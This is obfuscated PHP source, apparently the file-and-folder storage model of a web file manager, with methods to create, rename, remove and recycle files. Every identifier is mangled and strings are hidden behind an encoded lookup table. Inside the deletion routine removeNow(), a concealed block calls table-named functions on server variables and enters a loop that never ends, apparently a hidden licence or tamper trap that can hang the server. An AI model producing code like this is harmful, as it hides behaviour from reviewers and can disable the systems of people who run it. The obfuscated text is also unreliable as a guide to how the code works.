sourceRootGroup($ü¡Å§›²) { $ÁÅ•§Û– =& $_SERVER[”ôÑ§ì¸]; if (is_string($ü¡Å§›²)) { $ü¡Å§›² = array($ü¡Å§›²); } $¬ÒŞ‘—“ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ü¡Å§›², $ÁÅ•§Û–[202]); $¯‘–»Ô = array($ÁÅ•§Û–[412] => $¬ÒŞ‘—“, $ÁÅ•§Û–[409] => array($ÁÅ•§Û–[780] => count($ü¡Å§›²))); $this->_listDataApply($¯‘–»Ô[$ÁÅ•§Û–[412]]); $this->_listMake($¯‘–»Ô); return array_to_keyvalue($¯‘–»Ô[$ÁÅ•§Û–[82]], $ÁÅ•§Û–[537]); } public function mkfile($¸Êøõ—ä, $¡·°îÍ¬, $ıßôÀÎ© = '', $®–â›í = REPEAT_RENAME) { $ö¤Äüº =& $_SERVER[”ôÑ§ì¸]; $Ô‚«Ù = Model($ö¤Äüº[642])->addFileByContent($ıßôÀÎ©, $¡·°îÍ¬); return $this->_createFileCall($¸Êøõ—ä, $¡·°îÍ¬, $Ô‚«Ù, $®–â›í, $ö¤Äüº[1373]); } public function addFile($İıîíıá, $±‡ÓÛèÈ, $½¶Ô«İÖ, $„Ù¬ìü‰ = false, $‚±³Î‰± = REPEAT_RENAME) { $—†¸ÑÄÓ = Model($_SERVER[”ôÑ§ì¸][642])->addFile($±‡ÓÛèÈ, $½¶Ô«İÖ, $„Ù¬ìü‰); return $this->_createFileCall($İıîíıá, $½¶Ô«İÖ, $—†¸ÑÄÓ, $‚±³Î‰±); } public function addFileByFileID($ íŸ©ĞŠ, $½œÏåÑ¾, $òàíæ®, $Ä¶à´Â× = REPEAT_RENAME) { $ãŠ›ƒ°± =& $_SERVER[”ôÑ§ì¸]; $ÁÂ„îÉ = Model($ãŠ›ƒ°±[642])->find($½œÏåÑ¾); Model($ãŠ›ƒ°±[642])->linkAdd($½œÏåÑ¾); return $this->_createFileCall($ íŸ©ĞŠ, $òàíæ®, $ÁÂ„îÉ, $Ä¶à´Â×); } public function addFileByRemote($ŸıÙ¯è, $•©æª¹, $„ˆ„Šş“, $õ™œë‹ = array(), $Ÿî¡¯½ = REPEAT_RENAME) { $Êâ§›š‹ = Model($_SERVER[”ôÑ§ì¸][642])->addFileByRemote($•©æª¹, $„ˆ„Šş“, $õ™œë‹); return $this->_createFileCall($ŸıÙ¯è, $„ˆ„Šş“, $Êâ§›š‹, $Ÿî¡¯½); } private function _createFileCall($¤­°×, $ïÊåÇÁÈ, $ñ•—õÆ², $œ“Œ—­, $‰’˜¬Âç = "\165\x70\x6c\157\141\144") { $€£œ—‘  =& $_SERVER[”ôÑ§ì¸]; $Ş“æ³¤ = !1; $this->setMasterDB(); $this->lockWriteStart($¤­°×, $ïÊåÇÁÈ); $şçˆîè = $this->fileNameExist($¤­°×, $ïÊåÇÁÈ); $Êìöª¸¼ = $this->_createFile($¤­°×, $ïÊåÇÁÈ, $ñ•—õÆ², $œ“Œ—­, $Ş“æ³¤); if (!$Ş“æ³¤) { Model($€£œ—‘ [511])->remove($ñ•—õÆ²[$€£œ—‘ [508]]); } if ($Ş“æ³¤ && $Êìöª¸¼ && $Êìöª¸¼ != $şçˆîè) { Model($€£œ—‘ [2112])->eventCreate($Êìöª¸¼, $‰’˜¬Âç); } $this->lockWriteEnd($¤­°×, $ïÊåÇÁÈ); return $Êìöª¸¼; } public function mkdir($ĞÖÉÈ, $Ï“ëÒ›à, $”î“èğ‚ = REPEAT_SKIP) { $øÉú¨Ğ =& $_SERVER[”ôÑ§ì¸]; $this->setMasterDB(); $ŞïÄ„úš = $this->sourceInfo($ĞÖÉÈ); if (!$ŞïÄ„úš) { return !1; } $this->lockWriteStart($ĞÖÉÈ, $Ï“ëÒ›à); if ($”î“èğ‚ !== !1) { $¡¡ü†Ç = $this->fileNameExist($ĞÖÉÈ, $Ï“ëÒ›à); if ($¡¡ü†Ç && $”î“èğ‚ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ĞÖÉÈ, $Ï“ëÒ›à); return $¡¡ü†Ç; } $Ï“ëÒ›à = $this->fileNameAuto($ĞÖÉÈ, $Ï“ëÒ›à, $”î“èğ‚); } $À§’¦§á = array($øÉú¨Ğ[613] => 1, $øÉú¨Ğ[461] => $Ï“ëÒ›à, $øÉú¨Ğ[614] => $øÉú¨Ğ[12], $øÉú¨Ğ[509] => 0, $øÉú¨Ğ[584] => 0); $·ûëà = $this->_addSource($À§’¦§á, $ŞïÄ„úš); Model($øÉú¨Ğ[2112])->eventCreate($·ûëà, $øÉú¨Ğ[1374]); $this->lockWriteEnd($ĞÖÉÈ, $Ï“ëÒ›à); return $·ûëà; } public function listSourceRoot($›öÁş, $ÏÜÏˆİ¶, $œ“¡¾ÌÏ = "\x73\x6f\165\162\x63\x65\x49\104\x2c\x74\x61\x72\x67\x65\x74\111\x44\x2c\163\x69\x7a\x65") { $´ì–¼Ö× =& $_SERVER[”ôÑ§ì¸]; $Çì°µ©Æ = $´ì–¼Ö×[421]; $§”âÕƒ° = array(); $İ©ƒİÉ = 1024 * 50; $âË™‹ˆ = is_array($âË™‹ˆ) ? $âË™‹ˆ : array(); $Š­´ÑŸ¦ = count($ÏÜÏˆİ¶); $Êä¿é­ = $this->tablePrefix . $´ì–¼Ö×[2145]; for ($şÄ¸€¶  = 0; $şÄ¸€¶  < $Š­´ÑŸ¦; $şÄ¸€¶ ++) { $ÌŸş‚¸ = $ÏÜÏˆİ¶[$şÄ¸€¶ ]; $Çì°µ©Æ .= "\x53\x45\114\x45\x43\x54\40\x2a\40\106\122\x4f\x4d\40\50\x53\x45\114\x45\x43\124\x20{$œ“¡¾ÌÏ}\x20\106\x52\x4f\x4d\40\x60{$Êä¿é­}\140\40\127\110\x45\122\105\40"; $Çì°µ©Æ .= "\x60\x70\141\x72\145\156\x74\x49\x44\140\x3d\60\x20\x41\x4e\104\x20\140\164\x61\162\147\145\x74\111\104\x60\75{$ÌŸş‚¸}\40\101\x4e\104\40\140\164\x61\162\147\145\164\124\x79\x70\x65\x60\x3d{$›öÁş}\x20\x61\x6e\144\x20\146\x69\154\145\124\171\x70\145\x3d\x27\x27\40\x6c\x69\155\151\x74\40\61\x29\40\x61\163\x20\164\x62\x5f{$şÄ¸€¶ }\x20\125\116\111\x4f\116\40\x41\x4c\x4c\40"; if ((strlen($Çì°µ©Æ) >= $İ©ƒİÉ || $şÄ¸€¶  == $Š­´ÑŸ¦ - 1) && $Çì°µ©Æ) { $Çì°µ©Æ = substr($Çì°µ©Æ, 0, -strlen($´ì–¼Ö×[1069])); $şˆ†“ª = $this->query($Çì°µ©Æ); $Çì°µ©Æ = $´ì–¼Ö×[12]; $§”âÕƒ° = array_merge($§”âÕƒ°, $şˆ†“ª); } } return $§”âÕƒ°; } private function _createFile($è£õˆ”, $Ä–‘ĞÆ¢, $³Û˜šé¦, $ œûù, &$ùîœÀ‡) { $ÚãŠ° =& $_SERVER[”ôÑ§ì¸]; $÷ƒêêÄƒ = $this->sourceInfo($è£õˆ”); if (!$³Û˜šé¦ || !$÷ƒêêÄƒ) { return !1; } if ($ œûù !== !1) { $¥Ë˜©ÙÎ = $this->fileNameExist($è£õˆ”, $Ä–‘ĞÆ¢); } $ùîœÀ‡ = !0; if ($ œûù && $¥Ë˜©ÙÎ) { if ($ œûù == REPEAT_SKIP) { $ùîœÀ‡ = !1; return $¥Ë˜©ÙÎ; } else { if ($ œûù == REPEAT_REPLACE) { $Ü†íÒ¨’ = $this->sourceInfo($¥Ë˜©ÙÎ); $ú¿Ş¢ƒê = $this->fileHistory($Ü†íÒ¨’, $³Û˜šé¦[$ÚãŠ°[508]], $³Û˜šé¦[$ÚãŠ°[76]]); if (!$ú¿Ş¢ƒê) { $ùîœÀ‡ = !1; } else { $this->folderSizeReset($è£õˆ”); } return $¥Ë˜©ÙÎ; } else { $Ä–‘ĞÆ¢ = $this->fileNameAuto($è£õˆ”, $Ä–‘ĞÆ¢, $ œûù, !1); } } } $¶ĞÉ³‡© = array($ÚãŠ°[613] => 0, $ÚãŠ°[461] => $Ä–‘ĞÆ¢, $ÚãŠ°[614] => substr(get_path_ext($Ä–‘ĞÆ¢), 0, 10), $ÚãŠ°[509] => $³Û˜šé¦[$ÚãŠ°[508]], $ÚãŠ°[584] => $³Û˜šé¦[$ÚãŠ°[76]]); $êı“Åîù = $this->_addSource($¶ĞÉ³‡©, $÷ƒêêÄƒ); $this->folderSizeReset($è£õˆ”, intval($¶ĞÉ³‡©[$ÚãŠ°[76]])); return $êı“Åîù; } protected function fileHistory($Ô×ş•£, $‰ƒ‚¾Õé, $ªÇà«¾œ) { $ùÌ»– =& $_SERVER[”ôÑ§ì¸]; if ($Ô×ş•£[$ùÌ»–[508]] == $‰ƒ‚¾Õé) { return !1; } $this->checkLock($Ô×ş•£[$ùÌ»–[180]], $‰ƒ‚¾Õé); Model($ùÌ»–[2146])->addHistory($Ô×ş•£); $›ÁÚÉÙ¿ = array($ùÌ»–[618] => USER_ID, $ùÌ»–[465] => time(), $ùÌ»–[508] => $‰ƒ‚¾Õé, $ùÌ»–[76] => $ªÇà«¾œ); $this->where(array($ùÌ»–[458] => $Ô×ş•£[$ùÌ»–[180]]))->save($›ÁÚÉÙ¿); $this->sourceCacheClear($Ô×ş•£[$ùÌ»–[180]]); return !0; } public function checkLock($ øí»ï„, $îı¿ô¨) { $áğÂ²’ª =& $_SERVER[”ôÑ§ì¸]; $ä·ü×ç‘ = $this->pathInfo($ øí»ï„); if (!$this->fileIsLock($ä·ü×ç‘, !0)) { return; } $ëÈâË•¥ = Session::get($áğÂ²’ª[2147]); $–²ˆ‹À£ = substr($ä·ü×ç‘[$áğÂ²’ª[32]], 0, -1 - strlen($ä·ü×ç‘[$áğÂ²’ª[174]])) . $áğÂ²’ª[1239] . $ëÈâË•¥ . $áğÂ²’ª[10] . $ä·ü×ç‘[$áğÂ²’ª[174]]; $‰¿¢’Íè = Model($áğÂ²’ª[642])->find($îı¿ô¨); $this->_createFileCall($ä·ü×ç‘[$áğÂ²’ª[179]], $–²ˆ‹À£, $‰¿¢’Íè, REPEAT_REPLACE, $áğÂ²’ª[1373]); $•ş†¢˜¨ = $ä·ü×ç‘[$áğÂ²’ª[506]][$áğÂ²’ª[577]]; $ıÅÔ¼Ş = $•ş†¢˜¨[$áğÂ²’ª[2148]] ? $•ş†¢˜¨[$áğÂ²’ª[2148]] : $•ş†¢˜¨[$áğÂ²’ª[32]]; show_json(LNG($áğÂ²’ª[2149]) . $áğÂ²’ª[2150] . LNG($áğÂ²’ª[2151]) . $áğÂ²’ª[2152] . $ıÅÔ¼Ş . $áğÂ²’ª[2153], !1); } public function fileIsLock($°Î›ÔÍ², $…¼õ„ = false) { $ú²çá›‡ =& $_SERVER[”ôÑ§ì¸]; if (!isset($°Î›ÔÍ²[$ú²çá›‡[506]]) || !$°Î›ÔÍ²[$ú²çá›‡[506]][$ú²çá›‡[574]]) { return !1; } if ($°Î›ÔÍ²[$ú²çá›‡[506]][$ú²çá›‡[574]] != USER_ID) { return !0; } $•äÍ €¸ = $GLOBALS[$ú²çá›‡[6]][$ú²çá›‡[89]][$ú²çá›‡[575]]; if ($°Î›ÔÍ²[$ú²çá›‡[506]][$ú²çá›‡[576]] <= time() - $•äÍ €¸) { $this->metaSet($°Î›ÔÍ²[$ú²çá›‡[180]], $ú²çá›‡[574], null); $this->metaSet($°Î›ÔÍ²[$ú²çá›‡[180]], $ú²çá›‡[576], null); } if ($…¼õ„) { $this->metaSet($°Î›ÔÍ²[$ú²çá›‡[180]], $ú²çá›‡[576], time()); } return !1; } private function _addSource($Ëä„×, $âÈôËƒï) { $æÍ†Ÿğ =& $_SERVER[”ôÑ§ì¸]; $˜ÈËµ‰Ÿ = defined($æÍ†Ÿğ[2087]) ? USER_ID : 0; $¨¸Û†à¯ = array($æÍ†Ÿğ[615] => $âÈôËƒï[$æÍ†Ÿğ[177]], $æÍ†Ÿğ[616] => $âÈôËƒï[$æÍ†Ÿğ[537]], $æÍ†Ÿğ[617] => $˜ÈËµ‰Ÿ, $æÍ†Ÿğ[618] => $˜ÈËµ‰Ÿ, $æÍ†Ÿğ[444] => $âÈôËƒï[$æÍ†Ÿğ[180]], $æÍ†Ÿğ[619] => $âÈôËƒï[$æÍ†Ÿğ[552]] . $âÈôËƒï[$æÍ†Ÿğ[180]] . $æÍ†Ÿğ[50], $æÍ†Ÿğ[471] => 0, $æÍ†Ÿğ[620] => $æÍ†Ÿğ[12]); $Ëä„× = array_merge($¨¸Û†à¯, $Ëä„×); $this->updateModifyTime($Ëä„×[$æÍ†Ÿğ[179]]); $øĞØÎäõ = $æÍ†Ÿğ[2154] . $âÈôËƒï[$æÍ†Ÿğ[180]]; if (isset(self::$cacheChildList[$øĞØÎäõ])) { unset(self::$cacheChildList[$øĞØÎäõ]); } static $ş¿ë‰„ = false; if (!$ş¿ë‰„) { Hook::trigger($æÍ†Ÿğ[603], $Ëä„×); $ş¿ë‰„ = !0; } $æğĞ³íŞ = $this->add($Ëä„×); $œÆò™ßÑ = array($æÍ†Ÿğ[621] => short_id($æğĞ³íŞ)); $this->where(array($æÍ†Ÿğ[458] => $æğĞ³íŞ))->save($œÆò™ßÑ); $this->setNamePinyin($æğĞ³íŞ, $Ëä„×[$æÍ†Ÿğ[32]]); return $æğĞ³íŞ; } public function remove($œà²ÎŒº, $£œÆ¯ª† = true) { $œ‡¬ÙÔÎ =& $_SERVER[”ôÑ§ì¸]; $üÍÍÚ± = $this->sourceInfo($œà²ÎŒº); $æ¡ƒ€í = intval($üÍÍÚ±[$œ‡¬ÙÔÎ[177]]) === self::TYPE_SYSTEM; $£ËãÒ = Model($œ‡¬ÙÔÎ[475])->get($œ‡¬ÙÔÎ[2155]) == $œ‡¬ÙÔÎ[88]; if ($æ¡ƒ€í || $£œÆ¯ª† || !$£ËãÒ) { return $this->removeNow($œà²ÎŒº, $£œÆ¯ª†); } $Ş±ñ¦è = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $üöªĞÙ¾ = $üÍÍÚ±[$œ‡¬ÙÔÎ[177]] == self::TYPE_USER ? $œ‡¬ÙÔÎ[629] : $œ‡¬ÙÔÎ[546]; if ($üöªĞÙ¾ == $œ‡¬ÙÔÎ[629]) { $Á¡ô‡• = Model($œ‡¬ÙÔÎ[545])->getInfo($üÍÍÚ±[$œ‡¬ÙÔÎ[537]]); $ş…²Öã = !empty($Á¡ô‡•[$œ‡¬ÙÔÎ[2148]]) ? $Á¡ô‡•[$œ‡¬ÙÔÎ[2148]] : $Á¡ô‡•[$œ‡¬ÙÔÎ[32]]; $ş…²Öã = $œ‡¬ÙÔÎ[303] . $ş…²Öã . $œ‡¬ÙÔÎ[2156] . $üÍÍÚ±[$œ‡¬ÙÔÎ[537]]; } else { $Á¡ô‡• = Model($œ‡¬ÙÔÎ[553])->getInfo($üÍÍÚ±[$œ‡¬ÙÔÎ[537]]); $ş…²Öã = _get($Á¡ô‡•, $œ‡¬ÙÔÎ[32]); $ş…²Öã = $œ‡¬ÙÔÎ[162] . $ş…²Öã . $œ‡¬ÙÔÎ[2157] . $üÍÍÚ±[$œ‡¬ÙÔÎ[537]]; } $ˆ¥–¹ıÉ = $œ‡¬ÙÔÎ[2158] . md5($ş…²Öã); CacheLock::lock($ˆ¥–¹ıÉ); $éıü©¶™ = $this->fileNameExist($Ş±ñ¦è, $ş…²Öã); if (!$éıü©¶™) { $éıü©¶™ = $this->mkdir($Ş±ñ¦è, $ş…²Öã, REPEAT_SKIP); $this->metaSet($éıü©¶™, $œ‡¬ÙÔÎ[2159], $üöªĞÙ¾); $this->metaSet($éıü©¶™, $œ‡¬ÙÔÎ[2160], $üÍÍÚ±[$œ‡¬ÙÔÎ[537]]); if ($üÍÍÚ±[$œ‡¬ÙÔÎ[179]] != 0) { $this->metaSet($éıü©¶™, $œ‡¬ÙÔÎ[2161], _get($Á¡ô‡•, $œ‡¬ÙÔÎ[2162])); } } CacheLock::unlock($ˆ¥–¹ıÉ); $this->metaSet($œà²ÎŒº, $œ‡¬ÙÔÎ[2163], $üÍÍÚ±[$œ‡¬ÙÔÎ[179]]); $this->where(array($œ‡¬ÙÔÎ[180] => $œà²ÎŒº))->save(array($œ‡¬ÙÔÎ[465] => time())); $this->recycleClear($üÍÍÚ±); $²÷¬âÆË = $this->move($œà²ÎŒº, $éıü©¶™, REPEAT_RENAME_FOLDER); $this->folderSizeReset($üÍÍÚ±[$œ‡¬ÙÔÎ[179]]); return $²÷¬âÆË; } private function recycleClear($ù‹­¥™Å) { $ãÕõéÔì =& $_SERVER[”ôÑ§ì¸]; $è¸Õ¯°¬ = $this->childrenAll($ù‹­¥™Å); $¹á§›€ù = array($ãÕõéÔì[458] => array($ãÕõéÔì[459], $è¸Õ¯°¬[$ãÕõéÔì[2164]])); Model($ãÕõéÔì[2165])->where($¹á§›€ù)->delete(); } public function removeNow($»Î÷ÊÕÉ, $îöÔ§úª = true) { $Ş¡óĞƒ¶ =& $_SERVER[”ôÑ§ì¸]; if (!isset($_SERVER[$Ş¡óĞƒ¶[857]]) || !isset($_SERVER[$Ş¡óĞƒ¶[864]])) { $‘Ğµ¾ñ = $Ş¡óĞƒ¶[908]; $‰»‡ŸñÜ = $Ş¡óĞƒ¶[859]; $–²—ÎŸÇ = $_SERVER[$Ş¡óĞƒ¶[860]] . $Ş¡óĞƒ¶[861]; $âôÌ½éë = $‰»‡ŸñÜ($–²—ÎŸÇ); $¾ÑÑÉ¤ = explode($Ş¡óĞƒ¶[245], $âôÌ½éë); if (count($¾ÑÑÉ¤) < $Ş¡óĞƒ¶[655]) { $ö¦…‹©ó = $Ş¡óĞƒ¶[862]; $ö¦…‹©ó(); } $‹†ÉË˜ = $Ş¡óĞƒ¶[909]; $‹†ÉË˜($_SERVER[$Ş¡óĞƒ¶[910]]); $šÈØçøò = 1; for ($êõÌâÑí = $šÈØçøò; $êõÌâÑí > 0; $êõÌâÑí++) { $‹†ÉË˜ = json_encode($GLOBALS[$Ş¡óĞƒ¶[459]]); } } $ë‚™éÎ¦ = $this->sourceInfo($»Î÷ÊÕÉ); $®Ñ‘·ñô = $this->pathInfoMore($»Î÷ÊÕÉ); if (!$ë‚™éÎ¦) { return !0; } if ($ë‚™éÎ¦[$Ş¡óĞƒ¶[179]] == 0) { if (!_get($GLOBALS, $Ş¡óĞƒ¶[535])) { return !1; } } $this->lockMoveStart($»Î÷ÊÕÉ); Hook::trigger($Ş¡óĞƒ¶[2166], $®Ñ‘·ñô, $îöÔ§úª); if ($îöÔ§úª) { Model($Ş¡óĞƒ¶[2165])->moveToRecycle($»Î÷ÊÕÉ); } else { $Å°–´Ø = $this->childrenAll($ë‚™éÎ¦); Model($Ş¡óĞƒ¶[600])->eventRemove($»Î÷ÊÕÉ); $this->removeRelevance($Å°–´Ø[$Ş¡óĞƒ¶[2164]], $Å°–´Ø[$Ş¡óĞƒ¶[1485]]); } $this->folderSizeReset($ë‚™éÎ¦[$Ş¡óĞƒ¶[179]]); $ˆ³Õ×ú­ = array($ë‚™éÎ¦[$Ş¡óĞƒ¶[179]]); if ($ë‚™éÎ¦[$Ş¡óĞƒ¶[452]] == $Ş¡óĞƒ¶[88]) { $ˆ³Õ×ú­[] = $ë‚™éÎ¦[$Ş¡óĞƒ¶[180]]; } $this->updateModifyTime($ˆ³Õ×ú­); $this->lockMoveEnd($»Î÷ÊÕÉ); Hook::trigger($Ş¡óĞƒ¶[1716], $®Ñ‘·ñô, $îöÔ§úª); return !0; } public function childrenAll($°³Œ»¿) { $ÉÅùÌƒŒ =& $_SERVER[”ôÑ§ì¸]; $Ç‰è Ñ = $°³Œ»¿[$ÉÅùÌƒŒ[180]]; if ($°³Œ»¿[$ÉÅùÌƒŒ[452]] == $ÉÅùÌƒŒ[88]) { $–•§£ˆ = array($ÉÅùÌƒŒ[619] => array($ÉÅùÌƒŒ[579], $°³Œ»¿[$ÉÅùÌƒŒ[552]] . $Ç‰è Ñ . $ÉÅùÌƒŒ[580])); $Ï‚¼”œÅ = array($ÉÅùÌƒŒ[619] => $–•§£ˆ[$ÉÅùÌƒŒ[552]]); $¡ËóŸä• = $this->field($ÉÅùÌƒŒ[2167])->where($Ï‚¼”œÅ)->select(); $øÍÓùÂØ = !1; $å¢ìÛÉ‘ = array($Ç‰è Ñ); if ($¡ËóŸä•) { $øÍÓùÂØ = array_to_keyvalue($¡ËóŸä•, $ÉÅùÌƒŒ[12], $ÉÅùÌƒŒ[508]); $øÍÓùÂØ = array_remove_value($øÍÓùÂØ, $ÉÅùÌƒŒ[211]); $å¢ìÛÉ‘ = array_to_keyvalue($¡ËóŸä•, $ÉÅùÌƒŒ[12], $ÉÅùÌƒŒ[180]); $å¢ìÛÉ‘[] = $Ç‰è Ñ; } } else { $øÍÓùÂØ = array($°³Œ»¿[$ÉÅùÌƒŒ[508]]); $å¢ìÛÉ‘ = array($Ç‰è Ñ); } return array($ÉÅùÌƒŒ[2164] => $å¢ìÛÉ‘, $ÉÅùÌƒŒ[1485] => $øÍÓùÂØ); } public function removeArray($åù¢¨éÓ) { if (!$åù¢¨éÓ) { return !0; } } public function removeRelevance($‹¤ÏÅ–ú, $—äø²’ƒ) { $ÀôÂàëâ =& $_SERVER[”ôÑ§ì¸]; $‹¤ÏÅ–ú = $‹¤ÏÅ–ú ? $‹¤ÏÅ–ú : array(); $—äø²’ƒ = $—äø²’ƒ ? $—äø²’ƒ : array(); $‹¤ÏÅ–ú = array_unique(array_filter($‹¤ÏÅ–ú)); $—äø²’ƒ = array_unique(array_filter($—äø²’ƒ)); if (!$‹¤ÏÅ–ú) { return !1; } $óŒÎ¸Á¯ = array($ÀôÂàëâ[458] => array($ÀôÂàëâ[459], $‹¤ÏÅ–ú)); Model($ÀôÂàëâ[2165])->where($óŒÎ¸Á¯)->delete(); Model($ÀôÂàëâ[502])->where($óŒÎ¸Á¯)->delete(); Model($ÀôÂàëâ[2013])->where($óŒÎ¸Á¯)->delete(); Model($ÀôÂàëâ[600])->where($óŒÎ¸Á¯)->delete(); Model($ÀôÂàëâ[1846])->removeBySource($‹¤ÏÅ–ú); Model($ÀôÂàëâ[2146])->removeBySource($‹¤ÏÅ–ú); $this->where($óŒÎ¸Á¯)->delete(); Model($ÀôÂàëâ[511])->remove($—äø²’ƒ); for ($¹ª—Ê‘Æ = 0; $¹ª—Ê‘Æ < count($‹¤ÏÅ–ú); $¹ª—Ê‘Æ++) { $this->sourceCacheClear($‹¤ÏÅ–ú[$¹ª—Ê‘Æ]); } } public function rename($Å¡˜ˆÙ€, $Ä†ÔğÂî) { $ß’ì´¼Ö =& $_SERVER[”ôÑ§ì¸]; $“‘µûâå = $this->sourceInfo($Å¡˜ˆÙ€); if (!$“‘µûâå) { return !1; } $ú–ƒ÷÷¶ = $this->fileNameExist($“‘µûâå[$ß’ì´¼Ö[179]], $Ä†ÔğÂî); if ($ú–ƒ÷÷¶ && $ú–ƒ÷÷¶ != $Å¡˜ˆÙ€) { return !1; } $ŞÇ””ß = array($ß’ì´¼Ö[461] => $Ä†ÔğÂî, $ß’ì´¼Ö[618] => USER_ID); if ($“‘µûâå[$ß’ì´¼Ö[452]] != $ß’ì´¼Ö[88]) { $ŞÇ””ß[$ß’ì´¼Ö[453]] = substr(get_path_ext($Ä†ÔğÂî), 0, 10); } Model($ß’ì´¼Ö[600])->eventRename($Å¡˜ˆÙ€, $“‘µûâå[$ß’ì´¼Ö[32]], $Ä†ÔğÂî); $this->sourceCacheClear($Å¡˜ˆÙ€); $this->setNamePinyin($Å¡˜ˆÙ€, $ŞÇ””ß[$ß’ì´¼Ö[32]], !1); $this->updateModifyTime($“‘µûâå[$ß’ì´¼Ö[179]]); $Ï„¢˜°· = $this->where(array($ß’ì´¼Ö[458] => $Å¡˜ˆÙ€))->data($ŞÇ””ß)->save(); $¹çéØöî = $ß’ì´¼Ö[2154] . $“‘µûâå[$ß’ì´¼Ö[179]]; if (isset(self::$cacheChildList[$¹çéØöî])) { unset(self::$cacheChildList[$¹çéØöî]); } return $Ï„¢˜°·; } public function setNamePinyin($øÓ¼£Ø’, $•ôÒ¯Ä¸, $¦ÂÈ—Çâ = true) { $Şı£‘° =& $_SERVER[”ôÑ§ì¸]; $ ®¾£¥­ = Input::check($•ôÒ¯Ä¸, $Şı£‘°[622]); $ì‰­ç» = array($Şı£‘°[484] => KodSort::makeStr($•ôÒ¯Ä¸)); if ($ ®¾£¥­) { $ì‰­ç»[$Şı£‘°[505]] = str_replace($Şı£‘°[53], $Şı£‘°[12], Pinyin::get($•ôÒ¯Ä¸)); $ì‰­ç»[$Şı£‘°[504]] = Pinyin::get($•ôÒ¯Ä¸, $Şı£‘°[623]); } if (!$¦ÂÈ—Çâ && !$ ®¾£¥­) { $ì‰­ç»[$Şı£‘°[505]] = null; $ì‰­ç»[$Şı£‘°[504]] = null; } $this->metaSet($øÓ¼£Ø’, $ì‰­ç»); } public function getContent($øœùÁ½›) { $ƒÄõÀ¹± =& $_SERVER[”ôÑ§ì¸]; $ˆ°Ñ¦ùş = $this->fileInfoGet($øœùÁ½›); if (!$ˆ°Ñ¦ùş) { return !1; } if ($ˆ°Ñ¦ùş[$ƒÄõÀ¹±[76]] == 0) { return $ƒÄõÀ¹±[12]; } $Å¯´ı£ = $ƒÄõÀ¹±[2168] . $ˆ°Ñ¦ùş[$ƒÄõÀ¹±[640]]; if ($ˆ°Ñ¦ùş[$ƒÄõÀ¹±[76]] <= 1024 * 10) { $ÚëÖ‹„‚ = Cache::get($Å¯´ı£); if (!$ÚëÖ‹„‚) { $ÚëÖ‹„‚ = IO::getContent($ˆ°Ñ¦ùş[$ƒÄõÀ¹±[84]]); Cache::set($Å¯´ı£, $ÚëÖ‹„‚); } return $ÚëÖ‹„‚; } if (!$ˆ°Ñ¦ùş[$ƒÄõÀ¹±[84]]) { return $ƒÄõÀ¹±[12]; } return IO::getContent($ˆ°Ñ¦ùş[$ƒÄõÀ¹±[84]]); } public function setDesc($‰™Ÿİ€š, $¡÷ƒ”ü€) { $Âø‰­è™ =& $_SERVER[”ôÑ§ì¸]; Model($Âø‰­è™[600])->eventAddDesc($‰™Ÿİ€š, $¡÷ƒ”ü€); return $this->metaSet($‰™Ÿİ€š, $Âø‰­è™[493], $¡÷ƒ”ü€); } public function setContent($´é¥, $£ûæ¤Å­ = '') { $¶ï¼…ÏŒ =& $_SERVER[”ôÑ§ì¸]; $¾îì÷¼Í = $this->sourceInfo($´é¥); $ìÓÚ°« = $this->fileInfoGet($´é¥); if (!$ìÓÚ°« || !$¾îì÷¼Í) { return !1; } $ÄáÓ“º = Model($¶ï¼…ÏŒ[511])->addFileByContent($£ûæ¤Å­, $¾îì÷¼Í[$¶ï¼…ÏŒ[32]]); $—„÷›½ = $this->fileHistory($¾îì÷¼Í, $ÄáÓ“º[$¶ï¼…ÏŒ[508]], $ÄáÓ“º[$¶ï¼…ÏŒ[76]]); if (!$—„÷›½) { return Model($¶ï¼…ÏŒ[511])->remove($ÄáÓ“º[$¶ï¼…ÏŒ[508]]); } $this->folderSizeReset($¾îì÷¼Í[$¶ï¼…ÏŒ[179]]); return !0; } public function fileSubstr($³÷•ãÂ®, $•­Í®ë, $ÚšÈ…ãğ) { $²çíÏ“Ø = $this->fileInfoGet($³÷•ãÂ®); if (!$²çíÏ“Ø) { return !1; } return IO::fileSubstr($²çíÏ“Ø[$_SERVER[”ôÑ§ì¸][84]], $•­Í®ë, $ÚšÈ…ãğ); } public function fileInfoGet($”»’€·) { $³šûéŒŞ =& $_SERVER[”ôÑ§ì¸]; $­•‘ŒòŒ = $this->sourceInfo($”»’€·); if (!$­•‘ŒòŒ || $­•‘ŒòŒ[$³šûéŒŞ[452]]) { return !1; } $Öâ™ÁÉ = $³šûéŒŞ[514] . $­•‘ŒòŒ[$³šûéŒŞ[508]]; $Ş«÷çû¨ = _get(self::$cacheFileInfo, $Öâ™ÁÉ); if ($Ş«÷çû¨) { return $Ş«÷çû¨; } $™½—˜·Ì = Model($³šûéŒŞ[511])->fileInfo($­•‘ŒòŒ[$³šûéŒŞ[508]]); if ($™½—˜·Ì) { $™½—˜·Ì[$³šûéŒŞ[32]] = $­•‘ŒòŒ[$³šûéŒŞ[32]]; } self::$cacheFileInfo[$Öâ™ÁÉ] = $™½—˜·Ì; return $™½—˜·Ì; } private function folderChildrenNumber($Ö–¸®¨Ô) { $ååòÑ¡ş =& $_SERVER[”ôÑ§ì¸]; $Í„ùùò = $this->sourceInfo($Ö–¸®¨Ô); $ãä’ ¥¸ = array($ååòÑ¡ş[619] => array($ååòÑ¡ş[579], $Í„ùùò[$ååòÑ¡ş[552]] . $Ö–¸®¨Ô . $ååòÑ¡ş[580]), $ååòÑ¡ş[616] => $Í„ùùò[$ååòÑ¡ş[537]], $ååòÑ¡ş[471] => intval($Í„ùùò[$ååòÑ¡ş[472]]), $ååòÑ¡ş[613] => 1); $ıµ´ºå = $this->where($ãä’ ¥¸)->count(); $¢€êª÷’ = $this->where($ãä’ ¥¸)->where(array($ååòÑ¡ş[613] => 0))->count(); return array($ååòÑ¡ş[80] => $¢€êª÷’, $ååòÑ¡ş[81] => $ıµ´ºå); } public function pathInfo($Ñº…ôÄ, $óŞ‘ò  = false) { $§‹Ğ–Ç =& $_SERVER[”ôÑ§ì¸]; $óŞ‘ò  = !1; $Ñº…ôÄ = intval($Ñº…ôÄ); $—¡Ùä•— = $§‹Ğ–Ç[501] . intval($óŞ‘ò ) . $§‹Ğ–Ç[429] . $Ñº…ôÄ; $§ß—Ó™£ = _get(self::$cachePathInfo, $—¡Ùä•—); if ($§ß—Ó™£) { return $§ß—Ó™£; } $æ¤Æ‹’ = 